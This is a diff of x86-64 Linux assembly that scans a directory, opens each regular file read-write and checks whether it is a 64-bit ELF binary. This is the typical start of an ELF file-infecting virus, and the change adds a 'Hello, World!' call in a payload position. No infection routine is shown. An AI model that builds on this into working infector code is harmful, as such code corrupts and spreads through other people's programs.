@@ -49,7 +49,7 @@ getdents:
     mov rdi, rax ; save file descriptor
     mov rax, 217 ; syscall number for sys_getdents64
     lea rsi, [r15 + 400] ; buffer to store directory entries
-    mov rdx, 4096 ; size of buffer
+    mov rdx, 1024 ; size of buffer
     syscall ; invoke operating system to read directory entries
     test rax, rax ; check for error
     js safe_exit ; if error, exit
@@ -66,11 +66,17 @@ iterate_loop:
     cmp byte [r15 + 418 + rcx], 8 ; check if d_type is DT_REG
     jne .go_to_next
     
-    call open_file ; open file
+
+    lea rdi, [rcx + r15 + 419] ; filename
+    mov rsi, 2 ; O_RDWR
+    mov rdx, 0 ; mode
+    mov rax, SYS_OPEN ; syscall number for sys_open
+    syscall ; invoke operating system to open file
+    ; call open_file ; open file
+    mov r9, rax ; save file descriptor
     cmp rax, 0 ; check for error
     jbe .go_to_next ; if error, go to next entry
 
-    mov r9, rax ; save file descriptor
 
     ; read ehdr
 
@@ -89,6 +95,8 @@ iterate_loop:
     ; check if it's an ELF file
     cmp dword [r15 + 144], 0x464c457f ; check if it's an ELF file (magic number)
     jnz .close_file ; if not, go to next entry
+
+    call hello_world  ; print "Hello, World!"
 
 
     cmp byte [r15 + 148], 0x2 ; check if it's a 64-bit ELF file
